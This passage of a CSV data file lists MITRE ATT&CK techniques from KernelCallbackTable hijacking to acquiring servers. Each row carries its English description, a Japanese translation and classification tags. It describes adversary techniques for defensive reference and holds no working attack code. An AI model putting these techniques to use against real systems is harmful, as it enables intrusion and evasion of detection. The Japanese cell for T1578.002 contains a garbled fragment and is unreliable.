などの関連動作を伴う様々な方法で実現できます。 <code>KernelCallbackTable</code> のメモリアドレスへのポインタは、PEB を特定することで取得できます（例：<code>NtQueryInformationProcess()</code> [ネイティブ API](https://attack.mitre.org/techniques/T1106) 関数の呼び出しによる）。(引用: NtQueryInformationProcess)ポインタが特定されたら、<code>KernelCallbackTable</code>を複製し、テーブル内の関数（例: <code>fnCOPYDATA</code>）を悪意のあるペイロードのアドレスに設定します（例: <code>WriteProcessMemory()</code>経由）。 その後、PEB はテーブルの新しいアドレスで更新されます。改ざんされた関数が呼び出されると、悪意のあるペイロードがトリガーされます。(引用元: Lazarus APT January 2022) 改ざんされた関数は通常、Windows メッセージを使用して呼び出されます。 プロセスが乗っ取られ悪意のあるコードが実行された後、残りの悪意のあるペイロードによって<code>KernelCallbackTable</code>が元の状態に復元される場合もある。(引用: Lazarus APT January 2022) <code>KernelCallbackTable</code>を用いた実行フローの乗っ取りは、正当なプロセス下で実行を隠蔽できるため、セキュリティ製品の検知を回避する可能性がある。,persistence;privilege-escalation;defense-evasion,Windows,defense_disable,privilege_gain,user_interaction;endpoint_execution;cloud_control_plane,specified,Backup Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde,2022-02-25T15:27:44.927Z,2025-04-15T22:43:44.231Z,,,,
T1574.014,T1574,AppDomainManager,AppDomainManager,"Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) Known as ""AppDomainManager injection,"" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",攻撃者は、.NETの`AppDomainManager`がアセンブリをロードする方法を乗っ取ることで、独自の悪意のあるペイロードを実行する可能性があります。.NETフレームワークは、プロセス内で1つ以上の分離された実行環境（アプリケーションドメインと呼ばれる）を作成・管理し、.NETアプリケーションの実行をホストするために`AppDomainManager`クラスを使用します。 アセンブリ（.NETコードとして実行されるようにコンパイルされた`.exe`または`.dll`バイナリ）は、実行可能コードとしてアプリケーションドメインにロードされる可能性がある（引用元: Microsoft App Domains）。「AppDomainManagerインジェクション」として知られるこの手法では、攻撃者は.NETアプリケーションのアセンブリロード方法を乗っ取ることで任意のコードを実行できる。例えば、マルウェアはターゲットプロセス内にカスタムアプリケーションドメインを作成し、任意のアセンブリをロードして実行する可能性がある。 あるいは、.NETランタイム設定を定義する構成ファイル（`.config`）やプロセス環境変数を改ざんし、本来無害な.NETアプリケーションに悪意のあるアセンブリ（名前で特定）をターゲットプロセスにロードさせることも可能です。（引用元：PenTestLabs AppDomainManagerInject）（引用元：PwC Yellow Liderc）（引用元：Rapid7 AppDomain Manager Injection）,persistence;privilege-escalation;defense-evasion,Windows,config_policy_manipulation,privilege_gain,endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--356662f7-e315-4759-86c9-6214e2a50ff8,2024-03-28T15:36:34.141Z,2025-04-15T21:48:08.401Z,,,,
T1578,,Modify Cloud Compute Infrastructure,クラウドコンピューティングインフラの変更,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots. Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",攻撃者は防御を回避するため、クラウドアカウントのコンピューティングサービスインフラストラクチャを変更しようとする可能性があります。 コンピューティングサービスインフラストラクチャの変更には、コンピューティングインスタンス、仮想マシン、スナップショットなどのコンポーネントの作成、削除、変更が含まれる。インフラストラクチャコンポーネントの変更によって得られる権限は、既存インフラへのアクセスを制限する制約を回避する可能性がある。インフラストラクチャコンポーネントの変更は、攻撃者が検知を回避し、自身の存在の痕跡を消去することも可能にする。(引用: Mandiant M-Trends 2020),defense-evasion,IaaS,other,stealth,cloud_control_plane,specified,Backup Server,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--144e007b-e638-431d-a894-45d90c54ab90,2019-08-30T18:03:05.864Z,2025-04-15T22:49:33.134Z,,,,
T1578.001,T1578,Create Snapshot,スナップショットの作成,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",攻撃者は防御を回避するため、クラウドアカウント内にスナップショットまたはデータバックアップを作成する可能性がある。スナップショットとは、仮想マシン（VM）、仮想ハードドライブ、ボリュームなどの既存クラウドコンピューティングコンポーネントの特定時点のコピーである。 攻撃者は、既存のコンピューティングサービスインフラへのアクセスを制限する規制を回避するため、権限を利用してスナップショットを作成することがあります。これは、攻撃者が検出を回避し自身の存在の痕跡を消すためにスナップショットに復元する[クラウドインスタンスの復元](https://attack.mitre.org/techniques/T1578/004)とは異なります。 攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、作成したスナップショットを1つ以上そのインスタンスにマウントした後、作成したインスタンスへのアクセスを許可するポリシー（例：SSHの入出力アクセスを許可するファイアウォールポリシー）を適用することがあります。（引用元：Mandiant M-Trends 2020）,defense-evasion,IaaS,remote_service_abuse,stealth,network_connectivity;cloud_control_plane,specified,Backup Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1,2020-06-09T15:33:13.563Z,2025-04-15T22:11:14.755Z,,,,
T1578.002,T1578,Create Cloud Instance,クラウドインスタンスの作成,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020) Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",攻撃者は防御を回避するため、クラウドアカウントのコンピューティングサービス内に新しいインスタンスまたは仮想マシン（VM）を作成する可能性があります。新しいインスタンスの作成により、攻撃者はアカウント内に現在存在するインスタンスに適用されているファイアウォールルールや権限を迂回できる可能性があります。 攻撃者は、アカウント内の1つ以上のボリュームのスナップショットを作成し、新しいインスタンスを作成し、スナップショットをマウントし、より制限の少ないセキュリティポリシーを適用してローカルシステムからのデータを収集したり、リモートデータステージングのために使用したりする可能性があります。mitre.org/techniques/T1005) または [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002) のために。(引用元: Mandiant M-Trends 2020) 新しいインスタンスを作成することで、攻撃者は、現在実行中のインスタンスの実行に影響を与えることなく、環境内で悪意のある活動を実行することも可能になります。,defense-evasion,IaaS,config_policy_manipulation,stealth,endpoint_execution;network_connectivity;cloud_control_plane,specified,Backup Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c,2020-05-14T14:45:15.978Z,2025-04-15T22:10:54.239Z,,,,
T1578.003,T1578,Delete Cloud Instance,クラウドインスタンスの削除,An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable. An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020),攻撃者は、悪意のある活動を行った後、検知を回避し、自身の存在の証拠を消去するためにクラウドインスタンスを削除する可能性があります。 インスタンスまたは仮想マシンを削除すると、復元不可能な場合、貴重なフォレンジックアーティファクトやその他の不審な行動の証拠が失われる可能性があります。攻撃者はまた、[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002) を行い、目的を達成した後にインスタンスを終了させることもあります。(引用元: Mandiant M-Trends 2020),defense-evasion,IaaS,other,stealth,cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4,2020-06-16T17:23:06.508Z,2025-04-15T22:16:21.146Z,,,,
T1578.004,T1578,Revert Cloud Instance,クラウドインスタンスの復元,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",攻撃者は、悪意のある活動実行後にクラウドインスタンスへの変更を元に戻し、検知回避と痕跡消去を図る可能性がある。クラウド基盤のような高度に仮想化された環境では、クラウド管理ダッシュボードやAPIを介した仮想マシン（VM）やデータストレージのスナップショット復元で実現される。この手法の別形態として、コンピューティングインスタンスに接続された一時ストレージの活用がある。 ほとんどのクラウドプロバイダーは、永続的、ローカル、一時的など様々なタイプのストレージを提供しており、一時的なタイプはVMの停止/再起動時にリセットされることが多い。(引用元: Tech Republic - Restore AWS Snapshots)(引用元: Google - Restore Cloud Snapshot),defense-evasion,IaaS,other,stealth,cloud_control_plane;file_storage_access,specified,Backup Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1,2020-06-16T18:42:20.734Z,2025-04-25T14:45:42.495Z,,,,
T1578.005,T1578,Modify Cloud Compute Configurations,クラウドコンピューティング設定の変更,"Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim. For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy) Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535).",攻撃者は防御を回避するため、クラウドコンピューティングインフラのサイズ、ロケーション、利用可能なリソースに直接影響する設定を変更することがあります。これにはサービスクォータ、サブスクリプション関連付け、テナント全体のポリシー、利用可能なコンピューティングに影響するその他の設定が含まれます。このような変更により、攻撃者は実行中のインスタンスに影響を与えず、かつ被害者に活動を露呈させることなく、被害者のコンピューティングリソースを悪用して目的を達成できる可能性があります。 例えば、クラウドプロバイダーはクォータによって顧客のコンピューティングリソース使用量を制限することが多い。 顧客は増加した計算需要に対応するためこれらのクォータ調整を要求できますが、調整にはクラウドプロバイダーの承認が必要な場合があります。クラウド環境を侵害した攻撃者も同様に、被害者のクォータを全て消費することで疑いを招かずに追加の[リソースハイジャック](https://attack.mitre.org/techniques/T1496)を可能にするなど、自らの活動を支援するためにクォータ調整を要求する可能性があります。（引用元: Microsoft Cryptojacking 2023) 攻撃者はまた、デプロイされた仮想マシンのサイズを制限するテナント全体のポリシーを変更することで、許可されるリソース使用量を増やす可能性があります。(引用元: Microsoft Azure Policy) 攻撃者はさらに、クラウドリソースのデプロイ先を制御する設定を変更し、例えば[未使用/非サポートクラウドリージョン](https://attack.mitre.org/techniques/T1535)を有効化する可能性があります。,defense-evasion,IaaS,script_command_execution,stealth,authentication_system;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ca00366b-83a1-4c7b-a0ce-8ff950a7c87f,2023-09-05T14:19:17.486Z,2025-04-15T22:49:17.012Z,,,,
T1580,,Cloud Infrastructure Discovery,クラウドインフラストラクチャの発見,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services. Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas) An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",攻撃者は、インフラストラクチャ・アズ・ア・サービス（IaaS）環境内で利用可能なインフラストラクチャとリソースの発見を試みる可能性があります。これには、インスタンス、仮想マシン、スナップショットなどのコンピューティングサービスリソースに加え、ストレージやデータベースサービスを含む他のサービスのリソースも含まれます。 クラウドプロバイダーは、APIやCLI経由で発行されるコマンドなど、インフラストラクチャに関する情報を提供する手段を提供しています。例えば、AWSはAmazon EC2 API内に<code>DescribeInstances</code> APIを提供しており、アカウント内の1つ以上のインスタンスに関する情報を返すことができます。 認証済みリクエスト送信者が所有する全バケットのリストを返す<code>ListBuckets</code> API、バケットの存在とリクエスト送信者のアクセス権限を確認する<code>HeadBucket</code> API、バケットのアクセスブロック設定を取得する<code>GetPublicAccessBlock</code> APIなどが挙げられます。(引用元: Amazon Describe Instance)(引用元: Amazon Describe Instances API)(引用元: AWS Get Public Access Block)(引用元: AWS Head Bucket) 同様に、GCPのCloud SDK CLIはプロジェクト内の全Google Compute Engineインスタンスを一覧表示する<code>gcloud compute instances list</code>コマンドを提供します (引用元: Google Compute Instances)。AzureのCLIコマンド<code>az vm list</code>は仮想マシンの詳細を一覧表示します。(引用元: Microsoft AZ CLI) APIコマンドに加え、攻撃者はオープンソースツールを利用して[ワードリストスキャン](https://attack.mitre.org/techniques/T1595/003)によりクラウドストレージインフラを発見できます。(引用元: Malwarebytes OSINT Leaky Buckets - Hioureas) 攻撃者は侵害されたユーザーのアクセスキーを使用してリソースを列挙し、そのユーザーが利用可能なリソースを特定する可能性がある。(引用元: Expel IO Evil in AWS) こうした利用可能なリソースの発見は、攻撃者がクラウド環境における次の行動（例: 持続性確立）を決定する助けとなる。(引用元: Mandiant M-Trends 2020)攻撃者はこの情報を悪用し、設定を変更してバケットを公開アクセス可能にすることで、認証なしでデータにアクセスできるようにする可能性があります。攻撃者はまた、<code>DescribeDBInstances</code>などのインフラストラクチャ発見APIを使用して、データベースリソースのサイズ、所有者、権限、ネットワークACLを特定する場合もあります。 (引用元: AWS Describe DB Instances) 攻撃者はこの情報を利用してデータベースの潜在的価値を判断し、アクセス要件を発見できる。[クラウドサービス発見](https://attack.mitre.org/techniques/T1526)とは異なり、この手法はサービス自体ではなく、提供されるサービスの構成要素の発見に焦点を当てる。,discovery,IaaS,script_command_execution,situational_awareness,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;database_access,specified,Backup Server,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d,2020-08-20T17:51:25.671Z,2025-04-15T22:02:30.057Z,,,,
T1583,,Acquire Infrastructure,インフラストラクチャの取得,"Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase. Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",攻撃者は標的攻撃時に使用可能なインフラを購入、リース、レンタル、または入手する可能性があります。攻撃者活動のホスティングや調整に利用されるインフラは多岐にわたります。インフラソリューションには物理サーバーやクラウドサーバー、ドメイン、サードパーティ製ウェブサービスが含まれます。(引用元: TrendmicroHideoutsLease) 一部のインフラプロバイダーは無料トライアル期間を提供しており、限定的または無償でのインフラ取得を可能にします。(引用元: Free Trial PurpleUrchin) さらに、ボットネットもレンタルまたは購入可能である。これらのインフラソリューションを利用することで、敵対者は作戦の準備、開始、実行が可能となる。ソリューションは、サードパーティのウェブサービスへの接続や、[プロキシ](https://attack.mitre.org/techniques/T1090) をサポートするインフラの取得（住宅用プロキシサービスからの取得を含む）など、通常のトラフィックと見なされるものに敵対者の作戦を溶け込ませるのに役立つ可能性がある。(引用元: amnesty_nso_pegasus)(引用元: FBI Proxies Credential Stuffing)(引用元: Mandiant APT29 Microsoft 365 2022) 実装方法によっては、攻撃者は物理的に自身への追跡を困難にするインフラを利用したり、迅速にプロビジョニング・変更・停止可能なインフラを活用したりする可能性がある。,resource-development,PRE,credential_abuse,unknown,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;saas_in_use,specified,Mail / Collaboration;Proxy / Gateway,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2,2020-09-30T16:37:40.271Z,2025-04-15T21:44:09.753Z,,,,
T1583.001,T1583,Domains,ドメイン,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing) Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering) Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1) In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)",攻撃者は標的攻撃時に使用可能なドメインを取得する場合がある。ドメイン名は、1つ以上のIPアドレスを表す人間が読み取れる名称である。購入可能であり、場合によっては無料で取得できる。 攻撃者は、取得したドメインを[フィッシング](https://attack.mitre.org/techniques/T1566)、[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)、コマンドアンドコントロールなど、様々な目的に利用する可能性がある。(出典: CISA MSS 2020年9月) 攻撃者は、ホモグリフの使用や異なるトップレベルドメイン(TLD)の採用などにより、正規ドメインに類似したドメインを選択することがあります。(引用元: FireEye APT28)(引用元: PaypalScam) タイポスクワッティングは、[ドライブバイ・コンプロマイズ](https://attack.mitre.org/techniques/T1189) によるペイロードの配信を支援するために使用される場合があります。 攻撃者は国際化ドメイン名（IDN）や異なる文字セット（キリル文字、ギリシャ文字など）を用いて「IDNホモグラフ攻撃」を実行し、被害者マシンへマルウェアを配信するための視覚的に類似したドメインを作成する場合がある。（引用元：CISA IDN ST05-016）(引用: tt_httrack_fake_domains)(引用: tt_obliqueRAT)(引用: httrack_unhcr)(引用: lazgroup_idn_phishing) 被害者ごとに悪意のあるコンテンツを個別に配信するため、異なるURI/URLが動的に生成される場合もあります（ワンタイム・シングルユースドメイン名を含む）。(引用: iOS URL Scheme)(引用: URI)(引用: URI Use)(引用: URI Unique) 攻撃者は、期限切れドメインを取得して再利用する場合もあります。こうしたドメインは、既存の評判や履歴に基づいて防御側によってすでに許可リストに登録されている、あるいは信頼されている可能性があります。(引用: Categorisation_not_boundary)(引用: Domain_Steal_CC)(引用: Redirectors_Domain_Fronting)(引用: bypass_webproxy_filtering) ドメイン登録機関は、登録済みドメインごとの連絡先情報を公開するデータベースを管理している。プライベートWHOISサービスは、ドメイン所有者ではなく自社データなどの代替情報を表示する。 攻撃者は、購入したドメインの所有者情報を隠蔽するために、こうしたプライベートWHOISサービスを利用することがある。さらに、多様な登録情報を用いたり、異なるドメインレジストラでドメインを購入したりすることで、自身のインフラ追跡を妨害する。(引用: Mandiant APT1) 正当なドメイン購入に加え、攻撃者は侵害された環境で新規ドメインを登録することもある。 例えばAWS環境では、攻撃者はRoute53ドメインサービスを利用してドメインを登録し、脅威アクターが選択したリソースを指すホストゾーンを作成することがある。（引用元：Invictus IR DangerDev 2024）,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;network_connectivity;database_access,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3,2020-09-30T17:09:31.878Z,2025-04-15T22:23:15.751Z,,,,
T1583.002,T1583,DNS Server,DNSサーバー,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations. By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",攻撃者は標的攻撃時に使用可能な独自のドメインネームシステム（DNS）サーバーを設置することがある。侵害後の活動において、攻撃者はコマンドアンドコントロール（例：[アプリケーション層プロトコル](https://attack.mitre.org/techniques/T1071)）を含む様々なタスクにDNSトラフィックを利用する可能性がある。 既存DNSサーバーの乗っ取りではなく、攻撃者は作戦支援のため独自のDNSサーバーを設定・運用する選択肢もある。独自のDNSサーバーを運用することで、サーバー側のDNS C2トラフィックの管理方法をより制御できる（[DNS](https://attack.mitre.org/techniques/T1071/004)）。 DNSサーバーを制御することで、攻撃者はマルウェアに対して条件付き応答を提供するDNSアプリケーションを設定でき、一般的にDNSベースのC2チャネルの構造においてより柔軟性を得られます。（引用元：Unit42 DNS 2019年3月）,resource-development,PRE,script_command_execution,unknown,endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81,2020-10-01T00:40:45.279Z,2025-04-15T22:14:14.654Z,,,,
T1583.003,T1583,Virtual Private Server,仮想専用サーバー,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure. Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",攻撃者は標的攻撃時に利用可能な仮想専用サーバー（VPS）をレンタルする場合がある。仮想マシン/コンテナをサービスとして提供するクラウドサービスプロバイダーは多数存在する。VPSを利用することで、攻撃者は物理的に自身への操作の紐付けを困難にできる。クラウドインフラの利用は、攻撃者がインフラを迅速にプロビジョニング、変更、シャットダウンすることを容易にする。 コマンド＆コントロールなど攻撃者ライフサイクルの後期段階で使用するVPSを取得することで、攻撃者は評判の高いクラウドサービスプロバイダーに付随する普遍性と信頼性の恩恵を受けられる。また、最小限の登録情報でVPSをレンタルすることで知られるプロバイダーからインフラを取得し、より匿名性の高いインフラ取得を実現する場合もある。（引用元: TrendmicroHideoutsLease）,resource-development,PRE,script_command_execution,unknown,authentication_system;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795,2020-10-01T00:44:23.935Z,2025-04-15T23:18:46.651Z,,,,
T1583.004,T1583,Server,サーバー,"Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",攻撃者は標的攻撃中に使用可能な物理サーバーを購入、リース、レンタル、または入手する可能性がある。サーバーの使用により、攻撃者は作戦の準備、開始、実行が可能となる。侵害後の活動において、攻撃者はサーバーを様々なタスクに利用する可能性がある。例えば、[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189) などのウォーターホール攻撃、[フィッシング](https://attack.mitre.org/techniques/T1566) 攻撃の実行、[コマンドアンドコントロール](https://attack.mitre.org/tactics/TA0011) 